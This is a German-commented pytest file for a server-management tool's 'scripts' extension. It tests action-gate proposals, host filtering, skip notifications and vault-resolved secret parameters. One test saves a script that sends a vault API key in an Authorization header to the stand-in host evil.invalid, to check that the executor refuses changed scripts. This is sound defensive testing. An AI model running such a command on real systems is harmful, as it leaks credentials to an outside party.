"""scripts-Extension -- Git-Repository, Ausfuehrung ueber das Aktions-Gate, Zeitplan
ueber den Kern-Scheduler, "KI befoerdert wiederkehrenden Fix" ueber den Event-Bus
(docs/02-EXTENSION-API.md Paragraph 6).

Zwei Test-Stile, wie im Projekt ueblich (siehe test_ext_terminal.py vs.
test_ext_proxmox.py): die eigentliche Ausfuehrungs-/Ziel-/Geheimnis-Logik direkt gegen
die per `build_context()` geladene ECHTE Extension (schnell, kein HTTP/Auth-Overhead,
wie test_ext_terminal.py), das API-/Boot-Surface (Enable, Zeitplan-Registrierung,
CRUD ueber die echten HTTP-Routen) gegen die echte App+Auth (wie test_ext_proxmox.py).
"""

from __future__ import annotations

import dataclasses
import sys
from pathlib import Path

import pytest
from nodvard_sdk import ExtensionManifest
from nodvard_sdk.types import Event
from sqlalchemy import select

from nodvard_deck.core.events import get_event_bus
from nodvard_deck.ext.context import build_context
from nodvard_deck.ext.runtime import ExtensionRuntime, LoadedExtension, get_extension_runtime, reset_extension_runtime
from nodvard_deck.models import Action, AuditEntry, ExtensionRecord, Job
from nodvard_deck.services import extensions as extensions_service
from nodvard_deck.services import hosts as hosts_service
from nodvard_deck.services import settings as settings_service

REPO_EXTENSIONS_DIR = Path(__file__).resolve().parents[2] / "extensions"

_PERMISSIONS = [
    "hosts.read", "hosts.execute", "secrets.read:scripts-*", "schedule.register", "notify.send",
    "audit.write", "actions.standing_approval",
]


@pytest.fixture(autouse=True)
def _cleanup_sys_path():
    before = list(sys.path)
    yield
    sys.path[:] = before
    for name in list(sys.modules):
        if name.startswith(("nodvard_deck_ext_", "lattice_ext_")):
            del sys.modules[name]


def _scripts_extension_class():
    src_dir = REPO_EXTENSIONS_DIR / "scripts" / "src"
    if str(src_dir) not in sys.path:
        sys.path.insert(0, str(src_dir))
    import nodvard_deck_ext_scripts

    return nodvard_deck_ext_scripts.Extension


async def _setup_scripts_extension(tmp_path, settings, permissions=None, *, runtime=None):
    manifest = ExtensionManifest(
        id="scripts", name="Skripte", version="0.1.0", api_version="0.1",
        entrypoint="nodvard_deck_ext_scripts:Extension", permissions=permissions or _PERMISSIONS,
    )
    runtime = runtime if runtime is not None else ExtensionRuntime()
    loaded = LoadedExtension(
        manifest=manifest, instance=None, ctx=None, granted_permissions=permissions or _PERMISSIONS
    )
    ctx = build_context(runtime, loaded, manifest, permissions or _PERMISSIONS, tmp_path / "data", settings)
    loaded.ctx = ctx

    extension = _scripts_extension_class()()
    await extension.setup(ctx)
    return runtime, ctx, extension


@pytest.fixture
def settings_bound(test_settings):
    return test_settings


# --- Direkt gegen die geladene Extension (schnell, kein HTTP) ---------------------


async def _host_with_credential(db_session, settings, name, **fields):
    host = await hosts_service.create_host(db_session, name=name, address="10.0.0.1", **fields)
    await hosts_service.add_credential(
        db_session, settings, host_id=host.id, kind="ssh_password", username="root", port=22, secret_value="pw",
    )
    return host


@pytest.mark.asyncio
async def test_setup_registers_action_spec_and_seeds_no_script(tmp_path, db_session, settings_bound):
    """Frueher legte setup() ein Lynis-Skript (Ziel "Alle Server", jede
    Nacht, ohne sudo) an -- doppelt zu nexus-socs eigenem Haertungs-Audit. Eine
    frische Installation hat jetzt KEIN Skript."""
    runtime, _ctx, ext = await _setup_scripts_extension(tmp_path, settings_bound)

    assert ext._repo.list_ids() == []
    assert ext._repo.get("lynis-audit") is None

    entry = runtime.actions.get("script.run")
    assert entry is not None
    ext_id, spec = entry
    assert ext_id == "scripts"
    assert spec.command_field == "command"
    assert "hosts.execute" in spec.permissions


@pytest.mark.asyncio
async def test_deleted_lynis_script_does_not_come_back_after_restart(tmp_path, db_session, settings_bound):
    """Ein Admin loescht das alte Lynis-Skript -- beim naechsten Boot (setup()
    laeuft erneut) darf es nicht wieder auftauchen."""
    _runtime1, _ctx1, ext1 = await _setup_scripts_extension(tmp_path, settings_bound)
    from nodvard_deck_ext_scripts.repo import ScriptMeta

    # Stand einer alten Installation, in der der Seed noch angelegt wurde.
    ext1._repo.save(
        ScriptMeta(id="lynis-audit", name="Lynis-Sicherheitsaudit", target={"kind": "all"}, schedule="0 1 * * *"),
        "#!/bin/sh\nlynis audit system --quick --quiet\n",
        commit_message="scripts: Lynis-Sicherheitsaudit als Erststand angelegt",
    )
    ext1._repo.delete("lynis-audit")

    _runtime2, _ctx2, ext2 = await _setup_scripts_extension(tmp_path, settings_bound)
    assert ext2._repo.get("lynis-audit") is None
    assert ext2._repo.list_ids() == []


@pytest.mark.asyncio
async def test_setup_leaves_existing_scripts_untouched(tmp_path, db_session, settings_bound):
    """Ein Extension-Reload (jeder Boot) ruft `setup()` erneut auf -- vorhandene
    Skripte bleiben dabei unveraendert."""
    _runtime1, _ctx1, ext1 = await _setup_scripts_extension(tmp_path, settings_bound)
    from nodvard_deck_ext_scripts.repo import ScriptMeta

    ext1._repo.save(
        ScriptMeta(id="lynis-audit", name="Manuell umbenannt", target={"kind": "all"}, schedule="0 1 * * *"),
        "echo manuell veraendert\n",
        commit_message="manuelle Aenderung",
    )

    _runtime2, _ctx2, ext2 = await _setup_scripts_extension(tmp_path, settings_bound)
    script = ext2._repo.get("lynis-audit")
    assert script.meta.name == "Manuell umbenannt"
    assert script.content == "echo manuell veraendert\n"
    assert len(ext2._repo.history("lynis-audit", limit=10)) == 1


@pytest.mark.asyncio
async def test_run_script_proposes_one_action_per_target_host(tmp_path, db_session, settings_bound):
    """autonomy.mode=propose (Default) -- kein Host, kein SSH-Server noetig, die
    Aktion bleibt bei PROPOSED stehen (Vorschlag + Bestaetigung)."""
    _runtime, ctx, ext = await _setup_scripts_extension(tmp_path, settings_bound)
    from nodvard_deck_ext_scripts import run_script
    from nodvard_deck_ext_scripts.repo import ScriptMeta

    host = await hosts_service.create_host(db_session, name="h1", address="10.0.0.1")
    await db_session.commit()

    ext._repo.save(
        ScriptMeta(
            id="ping-test", name="Ping-Test", params_schema={"target_host": {"type": "string", "default": "1.1.1.1"}},
            target={"kind": "host", "host_id": host.id}, schedule=None, enabled=True,
        ),
        "ping -c 1 $target_host\n",
        commit_message="ping-test angelegt",
    )

    result = await run_script(ctx, ext._repo, "ping-test", param_overrides={})
    assert result["targets"] == 1
    assert result["results"][0]["status"] == "proposed"

    action = await db_session.get(Action, result["results"][0]["action_id"])
    assert action.status == "proposed"
    assert action.payload["command"] == "ping -c 1 1.1.1.1\n"  # Skriptinhalt endet mit Zeilenumbruch
    assert action.action_type == "script.run"


@pytest.mark.asyncio
async def test_run_script_targets_all_hosts_in_a_group(tmp_path, db_session, settings_bound):
    _runtime, ctx, ext = await _setup_scripts_extension(tmp_path, settings_bound)
    from nodvard_deck_ext_scripts import run_script
    from nodvard_deck_ext_scripts.repo import ScriptMeta

    in_group = await _host_with_credential(db_session, settings_bound, "in-group")
    outside = await _host_with_credential(db_session, settings_bound, "outside")
    group = await hosts_service.create_group(db_session, name="fleet")
    await hosts_service.add_group_member(db_session, group.id, in_group.id)
    await db_session.commit()

    ext._repo.save(
        ScriptMeta(id="group-script", name="Group-Skript", target={"kind": "group", "group_id": group.id}, enabled=True),
        "echo hi\n",
        commit_message="group-script angelegt",
    )

    result = await run_script(ctx, ext._repo, "group-script", param_overrides={})
    assert {r["host_id"] for r in result["results"]} == {in_group.id}
    assert outside.id not in {r["host_id"] for r in result["results"]}
    assert result["results"][0]["status"] == "proposed"


@pytest.mark.asyncio
async def test_run_script_shares_one_wait_budget_across_hosts(tmp_path, db_session, settings_bound, monkeypatch):
    """Die HTTP-Route gibt ein Zeitbudget mit -- fuer alle Server zusammen,
    nicht je Server; ein geplanter Lauf (ohne Budget) wartet wie bisher bis zum Ende."""
    _runtime, ctx, ext = await _setup_scripts_extension(tmp_path, settings_bound)
    import nodvard_deck_ext_scripts
    from nodvard_deck_ext_scripts import run_script
    from nodvard_deck_ext_scripts.repo import ScriptMeta
    from nodvard_sdk import ActionStatus, GateDecision, GateOutcome

    group = await hosts_service.create_group(db_session, name="fleet")
    for name in ("a", "b", "c"):
        host = await _host_with_credential(db_session, settings_bound, name)
        await hosts_service.add_group_member(db_session, group.id, host.id)
    await db_session.commit()
    ext._repo.save(
        ScriptMeta(id="fleet", name="Fleet", target={"kind": "group", "group_id": group.id}, enabled=True),
        "echo hi\n",
        commit_message="fleet angelegt",
    )

    clock = {"now": 0.0}
    waits: list[float | None] = []

    async def _fake_propose(request, *, wait_s=None):
        waits.append(wait_s)
        clock["now"] += 15.0  # jede Aktion braucht laenger als das halbe Budget
        return GateDecision(action_id=f"a{len(waits)}", outcome=GateOutcome.ALLOW, status=ActionStatus.EXECUTING)

    monkeypatch.setattr(nodvard_deck_ext_scripts.time, "monotonic", lambda: clock["now"])
    monkeypatch.setattr(ctx.actions, "propose", _fake_propose)

    result = await run_script(ctx, ext._repo, "fleet", param_overrides={}, wait_s=20.0)
    assert waits == [20.0, 5.0, 0.0]
    assert [r["status"] for r in result["results"]] == ["executing"] * 3

    waits.clear()
    await run_script(ctx, ext._repo, "fleet", param_overrides={})
    assert waits == [None, None, None]

@pytest.mark.asyncio
@pytest.mark.parametrize("target", [{"kind": "group"}, {"kind": "group", "group_id": None}, {"kind": "group", "group_id": ""}])
async def test_run_script_group_without_group_id_targets_nobody(tmp_path, db_session, settings_bound, target):
    """'Einer Gruppe' ohne gewaehlte Gruppe lief frueher auf ALLEN Servern,
    weil `ctx.hosts.list(group=None)` nicht filtert."""
    _runtime, ctx, ext = await _setup_scripts_extension(tmp_path, settings_bound)
    from nodvard_deck_ext_scripts import run_script
    from nodvard_deck_ext_scripts.repo import ScriptMeta

    for name in ("pve2", "pve1", "docker"):
        await _host_with_credential(db_session, settings_bound, name)
    await db_session.commit()
    ext._repo.save(
        ScriptMeta(id="no-group", name="Ohne Gruppe", target=target, enabled=True),
        "echo hi\n",
        commit_message="no-group angelegt",
    )

    result = await run_script(ctx, ext._repo, "no-group", param_overrides={})
    assert result["targets"] == 0
    assert result["results"] == []
    assert (await db_session.execute(select(Action))).scalars().all() == []


@pytest.mark.asyncio
@pytest.mark.parametrize("kind", ["all", "group"])
async def test_run_script_skips_hosts_without_ssh_access_windows_and_unmanaged(
    tmp_path, db_session, settings_bound, kind
):
    """'Alle Server'/'Gruppe' schlug frueher auch fuer Hosts ohne
    SSH-Zugangsdaten, Windows-VMs und nicht verwaltete Hosts einen Lauf vor, der
    garantiert scheitert. Jetzt nur noch ein Vorschlag fuer den passenden Host, die
    anderen stehen mit Grund als uebersprungen im Ergebnis."""
    _runtime, ctx, ext = await _setup_scripts_extension(tmp_path, settings_bound)
    from nodvard_deck_ext_scripts import run_script
    from nodvard_deck_ext_scripts.repo import ScriptMeta

    ok = await _host_with_credential(db_session, settings_bound, "docker")
    no_cred = await hosts_service.create_host(db_session, name="ki-server", address="192.168.2.87")
    windows = await _host_with_credential(db_session, settings_bound, "game-win", os_family="windows")
    unmanaged = await _host_with_credential(db_session, settings_bound, "fremd")
    await hosts_service.update_host(db_session, unmanaged.id, is_managed=False)
    group = await hosts_service.create_group(db_session, name="fleet")
    for h in (ok, no_cred, windows, unmanaged):
        await hosts_service.add_group_member(db_session, group.id, h.id)
    await db_session.commit()

    target = {"kind": "all"} if kind == "all" else {"kind": "group", "group_id": group.id}
    ext._repo.save(
        ScriptMeta(id="fleet-script", name="Fleet", target=target, enabled=True),
        "echo hi\n",
        commit_message="fleet-script angelegt",
    )

    result = await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
    proposed = [r for r in result["results"] if "action_id" in r]
    assert [r["host_id"] for r in proposed] == [ok.id]
    assert result["targets"] == 1
    skipped = {r["host_id"]: r["skipped"] for r in result["results"] if "skipped" in r}
    assert skipped == {
        no_cred.id: "keine SSH-Zugangsdaten",
        windows.id: "Windows-Server",
        unmanaged.id: "nicht verwaltet",
    }
    names = {r["host_name"] for r in result["results"] if "skipped" in r}
    assert names == {"ki-server", "game-win", "fremd"}

    actions = (await db_session.execute(select(Action).where(Action.action_type == "script.run"))).scalars().all()
    assert [a.host_id for a in actions] == [ok.id]
    assert actions[0].reason == "Skript 'Fleet' (fleet-script) ausführen"


async def _skip_notifications(db_session):
    from nodvard_deck.models import Notification as NotificationRow

    db_session.expire_all()
    rows = (
        await db_session.execute(
            select(NotificationRow).where(NotificationRow.source_ext_id == "scripts").order_by(NotificationRow.ts)
        )
    ).scalars().all()
    return [r for r in rows if (r.correlation_id or "").startswith("scripts-skip:")]


async def _fleet_setup(tmp_path, db_session, settings, *, with_windows=True):
    """Ein passender Host, einer ohne Zugangsdaten, optional ein Windows-Server; 'Alle Server'."""
    _runtime, ctx, ext = await _setup_scripts_extension(tmp_path, settings)
    from nodvard_deck_ext_scripts.repo import ScriptMeta

    await _host_with_credential(db_session, settings, "docker")
    no_cred = await hosts_service.create_host(db_session, name="ki-server", address="192.168.2.87")
    windows = None
    if with_windows:
        windows = await _host_with_credential(db_session, settings, "game-win", os_family="windows")
    await db_session.commit()
    ext._repo.save(
        ScriptMeta(id="fleet-script", name="Wartung", target={"kind": "all"}, schedule="0 3 * * *", enabled=True),
        "echo hi\n",
        commit_message="fleet-script angelegt",
    )
    return ctx, ext, no_cred, windows


@pytest.mark.asyncio
async def test_scheduled_run_reports_skipped_hosts_once(tmp_path, db_session, settings_bound):
    """Der Zeitplan meldet die uebersprungenen Server einmal, nicht jede Nacht."""
    ctx, ext, _no_cred, _win = await _fleet_setup(tmp_path, db_session, settings_bound)
    from nodvard_deck_ext_scripts import run_script

    first = await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
    assert len([r for r in first["results"] if "skipped" in r]) == 2
    notes = await _skip_notifications(db_session)
    assert len(notes) == 1
    assert notes[0].title == "Skript „Wartung“ überspringt Server"
    assert "ki-server (keine SSH-Zugangsdaten)" in notes[0].body
    assert "game-win (Windows-Server)" in notes[0].body
    assert notes[0].payload == {"path": "/ext/scripts/scripts"}

    await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
    await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
    assert len(await _skip_notifications(db_session)) == 1


@pytest.mark.asyncio
async def test_new_skipped_host_is_reported_alone_and_recovery_is_silent(tmp_path, db_session, settings_bound):
    ctx, ext, no_cred, _win = await _fleet_setup(tmp_path, db_session, settings_bound, with_windows=False)
    from nodvard_deck_ext_scripts import run_script

    no_cred_id = no_cred.id
    await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
    assert len(await _skip_notifications(db_session)) == 1

    # Ein neuer Windows-Server: genau eine weitere Meldung, die die ganze Liste nennt und
    # ihn als neu hervorhebt.
    await _host_with_credential(db_session, settings_bound, "game-win", os_family="windows")
    await db_session.commit()
    await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
    notes = await _skip_notifications(db_session)
    assert len(notes) == 2
    assert "ki-server (keine SSH-Zugangsdaten)" in notes[1].body
    assert "game-win (Windows-Server)" in notes[1].body
    assert "Neu dazugekommen: game-win." in notes[1].body

    # ki-server bekommt Zugangsdaten: faellt raus, keine Meldung.
    await hosts_service.add_credential(
        db_session, settings_bound, host_id=no_cred_id, kind="ssh_password", username="root", port=22, secret_value="pw",
    )
    await db_session.commit()
    await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
    assert len(await _skip_notifications(db_session)) == 2

    # Verliert er sie wieder, wird er erneut gemeldet.
    creds = await hosts_service.list_credentials(db_session, no_cred_id)
    for cred in creds:
        await hosts_service.delete_credential(db_session, no_cred_id, cred.id)
    await db_session.commit()
    await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
    notes = await _skip_notifications(db_session)
    assert len(notes) == 3
    assert "ki-server (keine SSH-Zugangsdaten)" in notes[2].body
    assert "game-win (Windows-Server)" in notes[2].body
    assert "Neu dazugekommen: ki-server." in notes[2].body


@pytest.mark.asyncio
async def test_manual_run_stays_silent_and_leaves_the_state_alone(tmp_path, db_session, settings_bound):
    from nodvard_sdk import Actor

    ctx, ext, _no_cred, _win = await _fleet_setup(tmp_path, db_session, settings_bound)
    from nodvard_deck_ext_scripts import run_script

    await run_script(ctx, ext._repo, "fleet-script", param_overrides={}, actor=Actor.user("u1"))
    assert await _skip_notifications(db_session) == []
    assert not (tmp_path / "data" / "skip-notices.json").exists()
    # Der erste Zeitplan-Lauf meldet trotzdem: ein Testlauf von Hand darf ihn nicht
    # stummschalten, sonst bliebe das nächtliche Überspringen unbemerkt.
    await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
    assert len(await _skip_notifications(db_session)) == 1


@pytest.mark.asyncio
async def test_failed_send_is_retried_at_the_next_scheduled_run(tmp_path, db_session, settings_bound, monkeypatch):
    ctx, ext, _no_cred, _win = await _fleet_setup(tmp_path, db_session, settings_bound)
    from nodvard_deck_ext_scripts import run_script

    real_send = ctx.notify.send

    async def _down(notification, **_kwargs):
        raise RuntimeError("ntfy nicht erreichbar")

    monkeypatch.setattr(ctx.notify, "send", _down)
    result = await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
    assert result["targets"] == 1  # der Lauf selbst klappt trotzdem
    assert await _skip_notifications(db_session) == []

    monkeypatch.setattr(ctx.notify, "send", real_send)
    await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
    assert len(await _skip_notifications(db_session)) == 1


class _PushChannel:
    """Ein echter Benachrichtigungs-Kanal (wie ntfy): bei Ausfall WIRFT `send()` -- der Kern
    faengt das ab und schreibt nur ein Zustellprotokoll."""

    channel_id = "ntfy-test"
    label = "ntfy-test"

    def __init__(self, *, down: bool) -> None:
        self.down = down
        self.attempts = 0
        self.received: list = []

    async def send(self, notification) -> None:
        self.attempts += 1
        if self.down:
            raise RuntimeError("ntfy nicht erreichbar")
        self.received.append(notification)


@pytest.mark.asyncio
async def test_dead_push_channel_is_retried_at_the_next_scheduled_run(tmp_path, db_session, settings_bound):
    """Faellt ntfy genau bei einer neuen Skip-Liste aus, geht der Push
    nicht fuer immer verloren -- der Kern schluckt den Kanalfehler, die Erweiterung sieht ihn
    ueber `raise_on_failure` und versucht es beim naechsten Zeitplan-Lauf erneut."""
    from nodvard_sdk.capabilities import NotificationChannel

    reset_extension_runtime()
    try:
        ctx, ext, _no_cred, _win = await _fleet_setup(tmp_path, db_session, settings_bound)
        from nodvard_deck_ext_scripts import run_script

        dead = _PushChannel(down=True)
        get_extension_runtime().capabilities.provide("ntfy", NotificationChannel, dead)
        result = await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
        assert result["targets"] == 1  # der Lauf selbst klappt trotzdem
        assert not (tmp_path / "data" / "skip-notices.json").exists() or "fleet-script" not in (
            tmp_path / "data" / "skip-notices.json"
        ).read_text(encoding="utf-8")

        reset_extension_runtime()
        healthy = _PushChannel(down=False)
        get_extension_runtime().capabilities.provide("ntfy", NotificationChannel, healthy)
        await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
        assert len(healthy.received) == 1 and healthy.received[0].title == "Skript „Wartung“ überspringt Server"
        # Danach ist der Stand gemerkt: keine weitere Meldung.
        await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
        assert len(healthy.received) == 1
    finally:
        reset_extension_runtime()


@pytest.mark.asyncio
async def test_dead_push_channel_is_retried_only_a_few_times(tmp_path, db_session, settings_bound):
    """Ein dauerhaft kaputter Kanal (ntfy falsch eingestellt) darf nicht bei jedem Zeitplan-
    Lauf einen weiteren In-App-Eintrag anlegen: nach 3 Versuchen bleibt der Stand gemerkt."""
    from nodvard_sdk.capabilities import NotificationChannel

    reset_extension_runtime()
    try:
        ctx, ext, no_cred, _win = await _fleet_setup(tmp_path, db_session, settings_bound)
        no_cred_id = no_cred.id
        from nodvard_deck_ext_scripts import run_script

        dead = _PushChannel(down=True)
        get_extension_runtime().capabilities.provide("ntfy", NotificationChannel, dead)
        for _ in range(6):
            result = await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
            assert result["targets"] == 1  # der Lauf selbst klappt jedes Mal
        assert dead.attempts == 3
        notes = await _skip_notifications(db_session)
        assert len(notes) == 3
        # Jeder Eintrag steht im Verlauf: keiner darf behaupten, es gäbe nur einen.
        assert all("kommt nur einmal" not in n.body and "bis zu dreimal" in n.body for n in notes)

        # Aufgegeben heisst: die Liste gilt als gemeldet, auch ein gesunder Kanal bekommt nichts mehr.
        reset_extension_runtime()
        healthy = _PushChannel(down=False)
        get_extension_runtime().capabilities.provide("ntfy", NotificationChannel, healthy)
        await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
        assert healthy.received == []

        # Aendert sich die Liste, wird wieder gemeldet (mit frischen Versuchen).
        await hosts_service.add_credential(
            db_session, settings_bound, host_id=no_cred_id, kind="ssh_password", username="root", port=22, secret_value="pw",
        )
        await db_session.commit()
        await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
        for cred in await hosts_service.list_credentials(db_session, no_cred_id):
            await hosts_service.delete_credential(db_session, no_cred_id, cred.id)
        await db_session.commit()
        await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
        assert len(healthy.received) == 1 and "Neu dazugekommen: ki-server." in healthy.received[0].body
    finally:
        reset_extension_runtime()


@pytest.mark.asyncio
async def test_no_notification_when_the_state_cannot_be_written(tmp_path, db_session, settings_bound, monkeypatch):
    ctx, ext, _no_cred, _win = await _fleet_setup(tmp_path, db_session, settings_bound)
    from nodvard_deck_ext_scripts import run_script, skipnotice

    def _boom(self, state):
        raise OSError("Schreibschutz")

    monkeypatch.setattr(skipnotice.SkipNotices, "_write", _boom)
    result = await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
    assert result["targets"] == 1  # der Lauf selbst klappt trotzdem
    await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
    assert await _skip_notifications(db_session) == []


@pytest.mark.asyncio
async def test_skip_state_survives_a_corrupt_file_and_delete_forgets_it(tmp_path, db_session, settings_bound):
    ctx, ext, _no_cred, _win = await _fleet_setup(tmp_path, db_session, settings_bound)
    from nodvard_deck_ext_scripts import run_script

    state_file = tmp_path / "data" / "skip-notices.json"
    await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
    assert state_file.exists()

    # Kaputte Datei: gilt als leerer Stand, es wird einmal neu gemeldet und repariert.
    state_file.write_text("{kaputt", encoding="utf-8")
    await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
    assert len(await _skip_notifications(db_session)) == 2
    await run_script(ctx, ext._repo, "fleet-script", param_overrides={})
    assert len(await _skip_notifications(db_session)) == 2

    from nodvard_deck_ext_scripts.skipnotice import SkipNotices

    notices = SkipNotices(state_file)
    notices.forget("fleet-script")
    assert notices.update("fleet-script", {}) == ({}, {})


@pytest.mark.asyncio
async def test_run_script_on_explicit_host_is_not_filtered(tmp_path, db_session, settings_bound):
    """Ein ausdruecklich gewaehlter Server bleibt unveraendert Ziel -- der Filter fuer
    ungeeignete Hosts gilt nur fuer 'Alle Server' und 'Gruppe'."""
    _runtime, ctx, ext = await _setup_scripts_extension(tmp_path, settings_bound)
    from nodvard_deck_ext_scripts import run_script
    from nodvard_deck_ext_scripts.repo import ScriptMeta

    windows = await hosts_service.create_host(db_session, name="game-win", address="10.0.0.5", os_family="windows")
    await db_session.commit()
    ext._repo.save(
        ScriptMeta(id="win-script", name="Win", target={"kind": "host", "host_id": windows.id}, enabled=True),
        "dir\n",
        commit_message="win-script angelegt",
    )

    result = await run_script(ctx, ext._repo, "win-script", param_overrides={})
    assert result["targets"] == 1
    assert result["results"][0]["status"] == "proposed"


@pytest.mark.asyncio
async def test_run_script_resolves_secret_typed_param_via_vault(tmp_path, db_session, settings_bound):
    _runtime, ctx, ext = await _setup_scripts_extension(tmp_path, settings_bound)
    from nodvard_deck_ext_scripts import run_script
    from nodvard_deck_ext_scripts.repo import ScriptMeta

    host = await hosts_service.create_host(db_session, name="h1", address="10.0.0.1")
    await db_session.commit()

    await ctx.secrets.create(label="scripts-secret-script-api_key", kind="generic", value="s3cr3t-value")

    ext._repo.save(
        ScriptMeta(
            id="secret-script", name="Secret-Skript",
            params_schema={"api_key": {"type": "secret", "label": "API-Key"}},
            target={"kind": "host", "host_id": host.id}, enabled=True,
        ),
        "curl -H 'Authorization: Bearer $api_key' https://example.invalid\n",
        commit_message="secret-script angelegt",
    )

    result = await run_script(ctx, ext._repo, "secret-script", param_overrides={})
    action = await db_session.get(Action, result["results"][0]["action_id"])
    # Der Klartext steht NICHT in der Aktion, nur der maskierte Befehl
    assert "s3cr3t-value" not in str(action.payload)
    assert "••••" in action.payload["command"]
    assert action.payload["script_id"] == "secret-script"
    assert action.payload["secret_params"] == ["api_key"]
    assert action.payload["params"] == {}


async def _secret_script(
    ctx, ext, db_session, *, content="curl -H 'Authorization: Bearer $api_key' https://example.invalid\n",
    secret_value="s3cr3t-value",
):
    """Skript mit geheimem Parameter (Tresor-Wert 's3cr3t-value') fuer die Tests zu geheimen Parametern."""
    from nodvard_deck_ext_scripts.repo import ScriptMeta

    host = await hosts_service.create_host(db_session, name="h1", address="10.0.0.1")
    await db_session.commit()
    await ctx.secrets.create(label="scripts-secret-script-api_key", kind="generic", value=secret_value)
    meta = ScriptMeta(
        id="secret-script", name="Secret-Skript",
        params_schema={"api_key": {"type": "secret", "label": "API-Key"}, "mode": {"type": "string", "default": "a"}},
        target={"kind": "host", "host_id": host.id}, enabled=True,
    )
    ext._repo.save(meta, content, commit_message="secret-script angelegt")
    return host, meta


def _capture_exec(monkeypatch, ctx):
    """Ersetzt `ctx.exec.run` durch einen Spion, der die Befehle sammelt."""
    from nodvard_sdk.types import ExecResult

    commands: list[str] = []

    async def _run(host, command, *, timeout_s=60, user=None, log_command=None):
        commands.append(command)
        return ExecResult(exit_code=0, stdout="ok", stderr="", duration_ms=1)

    monkeypatch.setattr(ctx.exec, "run", _run)
    return commands


@pytest.mark.asyncio
async def test_executor_rebuilds_the_real_command_from_the_vault(tmp_path, db_session, settings_bound, monkeypatch):
    _runtime, ctx, ext = await _setup_scripts_extension(tmp_path, settings_bound)
    from nodvard_deck_ext_scripts import _ScriptActionExecutor, run_script
    from nodvard_sdk import ActionRequest, Actor, Risk

    host, _meta = await _secret_script(
        ctx, ext, db_session, content="curl -H 'Authorization: Bearer $api_key' https://example.invalid/$mode\n"
    )
    commands = _capture_exec(monkeypatch, ctx)

    result = await run_script(ctx, ext._repo, "secret-script", param_overrides={"mode": "b"})
    action = await db_session.get(Action, result["results"][0]["action_id"])
    assert action.payload["params"] == {"mode": "b"}
    assert "s3cr3t-value" not in str(action.payload)

    executed = await _ScriptActionExecutor(ctx, ext._repo).execute(
        ActionRequest(
            action_type="script.run", host_ref=host.id, payload=dict(action.payload), risk=Risk.HIGH,
            proposed_by=Actor.extension("scripts"), reason="test",
        )
    )
    assert executed.success is True
    assert commands == ["curl -H 'Authorization: Bearer s3cr3t-value' https://example.invalid/b\n"]
    assert "s3cr3t-value" not in executed.model_dump_json()


@pytest.mark.asyncio
async def test_executor_refuses_when_the_script_changed_since_the_proposal(
    tmp_path, db_session, settings_bound, monkeypatch
):
    _runtime, ctx, ext = await _setup_scripts_extension(tmp_path, settings_bound)
    from nodvard_deck_ext_scripts import _ScriptActionExecutor, run_script
    from nodvard_sdk import ActionRequest, Actor, Risk

    host, meta = await _secret_script(ctx, ext, db_session)
    commands = _capture_exec(monkeypatch, ctx)
    result = await run_script(ctx, ext._repo, "secret-script", param_overrides={})
    action = await db_session.get(Action, result["results"][0]["action_id"])
    request = ActionRequest(
        action_type="script.run", host_ref=host.id, payload=dict(action.payload), risk=Risk.HIGH,
        proposed_by=Actor.extension("scripts"), reason="test",
    )

    # Inhalt geaendert (z. B. das Geheimnis wuerde an eine andere Adresse geschickt)
    ext._repo.save(meta, "curl -H 'Authorization: Bearer $api_key' https://evil.invalid\n", commit_message="geaendert")
    refused = await _ScriptActionExecutor(ctx, ext._repo).execute(request)
    assert refused.success is False
    assert refused.error == "Skript wurde seit dem Vorschlag geändert – bitte neu ausführen."

    # Parameter nicht mehr geheim: ebenfalls abgelehnt
    ext._repo.save(
        dataclasses.replace(
            meta, params_schema={"api_key": {"type": "string"}, "mode": {"type": "string", "default": "a"}}
        ),
        "curl -H 'Authorization: Bearer $api_key' https://example.invalid\n", commit_message="nicht mehr geheim",
    )
    assert (await _ScriptActionExecutor(ctx, ext._repo).execute(request)).success is False

    # Skript geloescht
    ext._repo.delete("secret-script")
    gone = await _ScriptActionExecutor(ctx, ext._repo).execute(request)
    assert gone.success is False and "geändert" in gone.error
    assert commands == [], "bei Abweisung wird nichts ausgefuehrt"


@pytest.mark.asyncio
async def test_executor_holds_no_vault_session_while_the_script_runs(
    tmp_path, db_session, settings_bound, monkeypatch
):
    """vault_use haelt eine DB-Verbindung, solange der Block offen ist -- waehrend des
    (bis zu 30 Minuten langen) Skriptlaufs darf keiner offen sein (Pool-Erschoepfung)."""
    import contextlib

    _runtime, ctx, ext = await _setup_scripts_extension(tmp_path, settings_bound)
    from nodvard_deck_ext_scripts import _ScriptActionExecutor, run_script
    from nodvard_sdk import ActionRequest, Actor, Risk
    from nodvard_sdk.types import ExecResult

    host, _meta = await _secret_script(ctx, ext, db_session)
    result = await run_script(ctx, ext._repo, "secret-script", param_overrides={})
    action = await db_session.get(Action, result["results"][0]["action_id"])

    open_blocks = 0
    opened = 0
    original = ctx.vault_use

    @contextlib.contextmanager
    def _count():
        nonlocal open_blocks, opened
        open_blocks += 1
        opened += 1
        try:
            yield
        finally:
            open_blocks -= 1

    def _vault_use(handle):
        @contextlib.asynccontextmanager
        async def _cm():
            with _count():
                async with original(handle) as value:
                    yield value

        return _cm()

    monkeypatch.setattr(ctx, "vault_use", _vault_use)
    seen: list[int] = []

    async def _run(host, command, *, timeout_s=60, user=None, log_command=None):
        seen.append(open_blocks)
        return ExecResult(exit_code=0, stdout="ok", stderr="", duration_ms=1)

    monkeypatch.setattr(ctx.exec, "run", _run)
